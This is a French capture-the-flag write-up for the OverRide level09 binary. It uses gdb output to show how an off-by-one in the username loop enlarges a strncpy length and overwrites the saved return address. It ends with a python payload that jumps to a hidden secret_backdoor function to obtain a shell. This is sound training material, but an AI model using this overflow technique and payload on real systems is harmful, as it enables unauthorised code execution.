@@ -1,0 +1,95 @@
+Un programme demandant un username dans l'entrée standard ainsi qu'un message, a priori "envoyé" à un autre user.
+En désassemblant, on découvre une fonction secret_backdoor, nous permettant d'appeler n'importe quel fonction grâce
+à un appel à system()
+
+	fgets(buffer, 128, stdin);
+	system(buffer);
+
+On souhaiterait donc pouvoir appeller cette fonction, probablement en réécrivant EIP pour la faire pointer sur celle-ci
+
+On récupère l'adresse de la fonction secret_backdoor:
+	(gdb) p secret_backdoor
+	$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+Les paramètres lus sur l'entrée standard sont stockés dans une structure
+	typedef struct s_message
+	{
+			char text[140];
+			char username[40];
+			int len;
+	} t_message;
+avec :
+- une boucle for de 41 itération pour l'username, qui ne fait que 40, on a un overflow de 1 potentiellement exploitable, qui sera
+	stocké dans la variable len
+- un strncpy de taille "len", qu'on pourrait modifier avec l'overflow cité ci-dessus
+
+On pourrait donc utilisé le 41eme caractère de l'username pour réécrire la len (de 0 a 255), et ainsi réécrire EIP grâce a la variable
+message. Tout cela n'est possible que si l'offset est inférieur a 247, sinon nous n'aurons pas la place.
+
+Il nous faut maintenant trouver l'offset pour vérifier notre théorie.
+
+	(gdb) disas handle_msg
+	Dump of assembler code for function handle_msg:
+		0x00005555555548c0 <+0>:     push   %rbp
+		0x00005555555548c1 <+1>:     mov    %rsp,%rbp
+		0x00005555555548c4 <+4>:     sub    $0xc0,%rsp
+		0x00005555555548cb <+11>:    lea    -0xc0(%rbp),%rax
+		0x00005555555548d2 <+18>:    add    $0x8c,%rax
+		0x00005555555548d8 <+24>:    movq   $0x0,(%rax)
+		0x00005555555548df <+31>:    movq   $0x0,0x8(%rax)
+		0x00005555555548e7 <+39>:    movq   $0x0,0x10(%rax)
+		0x00005555555548ef <+47>:    movq   $0x0,0x18(%rax)
+		0x00005555555548f7 <+55>:    movq   $0x0,0x20(%rax)
+		0x00005555555548ff <+63>:    movl   $0x8c,-0xc(%rbp)
+		0x0000555555554906 <+70>:    lea    -0xc0(%rbp),%rax
+		0x000055555555490d <+77>:    mov    %rax,%rdi
+		0x0000555555554910 <+80>:    callq  0x5555555549cd <set_username>
+		0x0000555555554915 <+85>:    lea    -0xc0(%rbp),%rax
+		0x000055555555491c <+92>:    mov    %rax,%rdi
+		0x000055555555491f <+95>:    callq  0x555555554932 <set_msg>
+		0x0000555555554924 <+100>:   lea    0x295(%rip),%rdi        # 0x555555554bc0
+		0x000055555555492b <+107>:   callq  0x555555554730 <puts@plt>
+		0x0000555555554930 <+112>:   leaveq
+		0x0000555555554931 <+113>:   retq
+
+On place un breakpoint juste après l'appel à set_msg:
+	(gdb) b*handle_msg+100
+	Breakpoint 1 at 0x924
+	(gdb) r
+	Starting program: /home/users/level09/level09
+	--------------------------------------------
+	|   ~Welcome to l33t-m$n ~    v1337        |
+	--------------------------------------------
+	>: Enter your username
+	>>: toto
+	>: Welcome, toto
+	>: Msg @Unix-Dude
+	>>: tata
+
+	Breakpoint 1, 0x0000555555554924 in handle_msg ()
+	(gdb) x $eax
+	0xffffffffffffe500:     Cannot access memory at address 0xffffffffffffe500
+	(gdb) i f
+	Stack level 0, frame at 0x7fffffffe5d0:
+	rip = 0x555555554924 in handle_msg; saved rip 0x555555554abd
+	called by frame at 0x7fffffffe5e0
+	Arglist at 0x7fffffffe5c0, args:
+	Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
+	Saved registers:
+		rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
+
+offset = fin $ebp - $eax = 0x7fffffffe5c8 - 0xffffffffffffe500 = 200
+
+L'offset est bien inférieur à 247, place à l'exploit. On va donc remplacer EIP par l'adresse de secret_backdoor, en forcant une len à \xd0 (208)
+
+python -c 'print "A"*40 + "\xd0" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"' > /tmp/exploit9
+
+	level09@OverRide:~$ cat /tmp/exploit9 - | ./level09
+	--------------------------------------------
+	|   ~Welcome to l33t-m$n ~    v1337        |
+	--------------------------------------------
+	>: Enter your username
+	>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
+	>>: >: Msg sent!
+	whoami
+	end
